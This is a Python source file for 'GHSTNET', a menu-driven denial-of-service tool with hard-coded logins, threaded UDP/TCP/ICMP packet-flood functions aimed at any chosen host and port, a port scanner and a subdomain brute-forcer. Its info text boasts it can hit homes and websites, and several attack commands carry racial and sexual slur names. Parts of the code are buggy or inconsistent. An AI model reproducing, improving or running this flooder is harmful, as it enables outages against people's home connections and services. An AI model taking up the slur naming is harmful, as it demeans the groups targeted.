#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import requests
import random
import threading
import getpass
import os
import colorama
from colorama import *

sys.stdout.write("\x1b]2;GHSTNET || Loaded: 19\x07")
def modifications():
    print ("Contact Misfortune or Reaper the script is currently under maitnance")
    on_enter = input("Please press enter to leave")
    exit()
#column:65
method = """\033[91m
╔════════════════════════════════════════════════════════╗
║                      \033[00mM E T H O D S\033[91m                     ║               
║════════════════════════════════════════════════════════║
║═══════════════════════VIP═METHODS══════════════════════║
║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP   ATTACK\033[91m ║
║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m STD   ATTACK\033[91m ║
║ \033[00mTCP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m TCP   ATTACK\033[91m ║
║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m ICMP  ATTACK\033[91m ║
║ \033[00mRAPE <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
║ \033[00mCOON <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
║ \033[00mSLPR <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
║ \033[00mBNET <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m USE INFO CMD\033[91m ║
║ \033[00mNULL <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
║═══════════════════════FREE═METHOD══════════════════════║              
║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
╚════════════════════════════════════════════════════════╝\033[00m
"""
 
info = """
[ ghstinfo ] welcome to the new net with little power bit still enough to hit a home and web
[ ghstinfo ] bnet info: it kills botnets quite well
[ ghstinfo ] all cslap, cnuke, bnet methods are custom"""
 
version = "3.2"
 
help = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mBASIC COMMANDS\033[91m                    ║
║══════════════════════════════════════════════════════║
║ \033[00mClear                         \033[91m|\033[00m CLEAR SCREEN\033[91m         ║
║ \033[00mExit                          \033[91m|\033[00m EXIT GHSTNET\033[91m         ║
║ \033[00mMethods                       \033[91m|\033[00m GHST METHODS\033[91m         ║
║ \033[00mTools                         \033[91m|\033[00m BASIC TOOLS\033[91m          ║
║ \033[00mUpdates                       \033[91m|\033[00m DISPLAY UPDATE NOTES\033[91m ║
║ \033[00mInfo                          \033[91m|\033[00m DISPLAY GHSTNET INFO\033[91m ║
╚══════════════════════════════════════════════════════╝\033[00m
"""
 
tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTOOLS\033[91m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mStopattacks                   \033[91m|\033[00m STOP ALL ATTACKS\033[91m     ║
║ \033[00mAttacks                       \033[91m|\033[00m RUNNING ATTACKS\033[91m      ║
║ \033[00mPing <HOST>                   \033[91m|\033[00m PING A HOST\033[91m          ║
║ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ║
║ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ║
║ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ║
║ \033[00mStats                         \033[91m|\033[00m DISPLAY GHSTNET STATS\033[91m║
╚══════════════════════════════════════════════════════╝\033[00m
"""
 
updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUPDATE NOTES\033[91m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m- Better ascii menu\033[91m                                  ║
║ \033[00m- Updated command casing no longer only capital\033[91m      ║
║ \033[00m- Updated attack methods\033[91m                             ║
║ \033[00m- Timeout bug fixed\033[91m                                  ║
║ \033[00m- Background attacks\033[91m                                 ║
║ \033[00m- Running task displayer\033[91m                             ║
║ \033[00m- All tools fixed and working\033[91m                        ║
║ \033[00m- Fixed HTTP & SYN Methods All Methods Working\033[91m       ║ 
║ \033[00m- Deleted HTTP & Added STD, STD Is Working & Tested\033[91m  ║
╚══════════════════════════════════════════════════════╝\033[00m
 
"""
statz = """
 
║              \033[00mSTATS\033[91m                     ║
 
\033[00m- Attacks: \033[91m{}                                        
\033[00m- Found Domains: \033[91m{}                                  
\033[00m- PINGS: \033[91m{}                                          
\033[00m- PORTSCANS: \033[91m{}                                      
\033[00m- GRABBED IPS: \033[91m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""

 
altbanner = """▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ --- GHSTNET
▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
                      
"""
 
cookie = open(".sinfull_cookie","w+")
 
fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
username = ""
grade = ""
attack = True
http = True
udp = True
syn = True
icmp = True
std = True
class Master:
 
    def __init__(self, grade):
        self.grade = "null"
 

 
def synsender(host, port, timer, payload):
    global uaid
    global udp
    global aid
    global tattacks
    global said
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    said += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(payload, (host, int(port)))
    said -= 1
    aid -= 1

def custom2(host, port, timer, payload):
    global uaid
    global udp
    global aid
    global tattacks
    global said
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    
    said += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(payload, (host, int(port)))
    said -= 1
    aid -= 1
def custom3(host, port, timer, payload):
    global uaid
    global udp
    global aid
    global tattacks
    global said
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
    
    said += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(payload, (host, int(port)))
    said -= 1
    aid -= 1

def custom4(host, port, timer, payload):
    global uaid
    global udp
    global aid
    global tattacks
    global said
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    said += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(payload, (host, int(port)))
    said -= 1
    aid -= 1

def custom(host, port, timer, payload):
    global uaid
    global udp
    global aid
    global tattacks
    global said
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    said += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(payload, (host, int(port)))
    said -= 1
    aid -= 1
    
def udpsender(host, port, timer, punch):
    global uaid
    global udp
    global aid
    global tattacks
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    uaid += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and udp and attack:
        sock.sendto(punch, (host, int(port)))
    uaid -= 1
    aid -= 1
 
def icmpsender(host, port, timer, punch):
    global iaid
    global icmp
    global aid
    global tattacks
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
 
    iaid += 1
    aid += 1
    tattacks += 1    
    while time.time() < timeout and icmp and attack:
        sock.sendto(punch, (host, int(port)))
    iaid -= 1
    aid -= 1
 
def stdsender(host, port, timer, punch):
    global iaid
    global icmp
    global aid
    global tattacks
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
 
    iaid += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and icmp and attack:
        sock.sendto(punch, (host, int(port)))
    iaid -= 1
    aid -= 1
 
def httpsender(host, timer):
    global haid
    global icmp
    global aid
    global tattacks
 
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    haid += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and icmp and attack:
         requests.get(host)
         #sock.sendto(payload, (host, int(port)))
        #sock.sendto(punch, (host, int(port)))
    haid -= 1
    aid -= 1
 
 
def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp
    global syn
    global icmp
    global std
 
    while True:
        grade = "0"
        if username == "root":
            grade = "ADMIN"
        elif username == "guest":
            grade = "GUEST"
        sys.stdout.write("\x1b]2; G H S T  N E T \x07")
        sin = input("\033[1;00m[\033[91mGHST\033[1;00m]-\033[91m$\033[00m ").lower()
        sinput = sin.split(" ")[0]
        if sinput == "clear":
            os.system ("clear")
            print (altbanner)
            main()
        elif sinput == "help":
            print (help)
            main()
        elif sinput == "":
            main()
        elif sinput == "exit":
            exit()
        elif sinput == "version":
            print ("ghstnet version: "+version+" ")
        elif sinput == "stats":
            print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
            print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
            print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
            print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
            print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
            main()
        elif sinput == "methods":
            print (method)
            main()
        elif sinput == "tools":
            print (tools)
            main()
        elif sinput == "portscan":
            port_range = int(sin.split(" ")[2])
            pscans += 1
            def scan(port, ip):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((ip, port))
                    print ("[\033[91mGHST\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
                    sock.close()
                except socket.error:
                    return
                except KeyboardInterrupt:
                    print ("\n")
            for port in range(1, port_range+1):
                ip = socket.gethostbyname(sin.split(" ")[1])
                threading.Thread(target=scan, args=(port, ip)).start()
        elif sinput == "updates":
            print (updatenotes)
            main()
        elif sinput == "info":
            print (info)
            main()
        elif sinput == "attacks":
            print ("\n[\033[91mGHST\033[00m] UPD Running processes: {}".format (uaid))
            print ("[\033[91mGHST\033[00m] ICMP Running processes: {}".format (iaid))
            print ("[\033[91mGHST\033[00m] SYN Running processes: {}".format (said))
            print ("[\033[91mGHST\033[00m] STD Running Processes: {}".format (said))
            print ("[\033[91mGHST\033[00m] WRK Running Processes: {}".format (haid))
            print ("[\033[91mGHST\033[00m] Total attacks running: {}\n".format (aid))
            main()
        elif sinput == "dnsresolve":
            sfound = 0
            sys.stdout.write("\x1b]2;G H S T  N E T  |{}| F O U N D\x07".format (sfound))
            try:
                host = sin.split(" ")[1]
                with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
                    domains = sub.readlines()   
                for link in domains:
                    try:
                        url = link.strip() + "." + host
                        subips = socket.gethostbyname(url)
                        print ("[\033[91mGHST\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
                        sfound += 1
                        fsubs += 1
                        sys.stdout.write("\x1b]2;G H S T N E T |{}| F O U N D\x07".format (sfound))
                    except socket.error:
                        pass
                        #print ("[\033[91mGHST\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
                print ("[\033[91mGHST\033[00m] Task complete | found: {}".format(sfound))
                main()
            except IndexError:
                print ('ADD THE HOST!')
        elif sinput == "resolve":
            liips += 1
            host = sin.split(" ")[1]
            host_ip = socket.gethostbyname(host)
            print ("[\033[91mGHST\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
            main()
        elif sinput == "ping":
            tpings += 1
            try:
                sinput, host, port = sin.split(" ")
                print ("[\033[91mGHST\033[00m] Starting ping on host: {}".format (host))
                try:
                    ip = socket.gethostbyname(host)
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host un-resolvable")
                    main()
                while True:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        start = time.time() * 1000
                        sock.connect ((host, int(port)))
                        stop = int(time.time() * 1000 - start)
                        sys.stdout.write("\x1b]2;G H S T  N E T |{}ms| D E M O N S\x07".format (stop))
                        print ("Ghstnet: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
                        sock.close()
                        time.sleep(1)
                    except socket.error:
                        sys.stdout.write("\x1b]2;G H S T N E T |TIME OUT| D E M O N S\x07")
                        print ("Ghstnet: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
                        time.sleep(1)
                    except KeyboardInterrupt:
                        print("")
                        main()
            except ValueError:
                print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                main()
        elif sinput == "udp":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("UDP: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "rape":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                    print ("RAPE: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=custom, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "coon":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                    print ("COON: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=custom, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "null":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("NULL: Attack sent to: {}".format (host))
                    payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                    #punch = random._urandom(int(pack))
                    threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "tcp":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                    print ("TCP: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=custom3, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "slpr":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                    print ("SLPR: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=custom2, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "bnet":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                    print ("BNET: Attack sent to: {}".format (host))
                    
                    threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "std":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("STD: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "http":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "icmp":
            if username == "guest":
                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("ICMP: Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "syn":
            try:
                sinput, host, port, timer, pack = sin.split(" ")
                socket.gethostbyname(host)
                print ("SYN: Attack sent to: {}".format (host))
                punch = random._urandom(int(pack))
                threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
            except ValueError:
                print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                main()
            except socket.gaierror:
                print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                main()
        elif sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            what = sin.split(" ")[1]
            if what == "udp":
                print ("Stoping all udp attacks")
                udp = False
                while not udp:
                    if aid == 0:
                        print ("[\033[91mGHST\033[00m] No udp Processes running.")
                        udp = True
                        main()
            if what == "icmp":
                print ("Stopping all icmp attacks")
                icmp = False
                while not icmp:
                    print ("[\033[91mGHST\033[00m] No ICMP processes running")
                    udp = True
                    main()
        else:
            print ("[\033[91mGHST\033[00m] {} Not a command".format(sinput))
            main()
 
 
 
try:
    users = ["root", "guest", "me", "ghstdev"]
    clear = "clear"
    os.system (clear)
    username = getpass.getpass ("[+] Username: ")
    if username in users:
        user = username
    else:
        print ("[+] Incorrect, exiting")
        exit()
except KeyboardInterrupt:
    print ("\nCTRL-C Pressed")
    exit()
try:
    
    passwords = ["root", "ghstnet", "me", "ghstdev"]
    password = getpass.getpass ("[+] Password: ")
    if user == "root":
        if password == passwords[0]:
            print ("[+] Login correct, GRADE: ADMIN")
            grade = "ADMIN"
            cookie.write("DIE")
            time.sleep(2)
            os.system (clear)
            banner = f"""{Fore.RED}
▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
 ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
 ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
 ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
   ░       ░  ░       ░ ░          ░ ░           ░    
 ░                    ░                    
{Fore.RESET}           
"""
            try:
                os.system ("clear")
                banner = f"""{Fore.RED}
▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
 ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
 ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
 ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
   ░       ░  ░       ░ ░          ░ ░           ░    
 ░                    ░                    
{Fore.RESET}           
"""
                print (banner)
                main()
            except KeyboardInterrupt:
                
                main()
        else:
            print ("[+] Incorrect, exiting")
            exit()
    if user == "guest":
        if password == passwords[1]:
            print ("[+] Login correct, GRADE: GUEST")
            grade = "FREE"
            time.sleep(4)
            os.system (clear)
            try:
                os.system ("clear")
                banner = f"""{Fore.RED}
▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
 ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
 ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
 ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
   ░       ░  ░       ░ ░          ░ ░           ░    
 ░                    ░                    
{Fore.RESET}           
"""
                print (banner)
                main()
            except KeyboardInterrupt:
                main()
        else:
            print ("[+] Incorrect, exiting")
            exit()
except KeyboardInterrupt:
    exit()
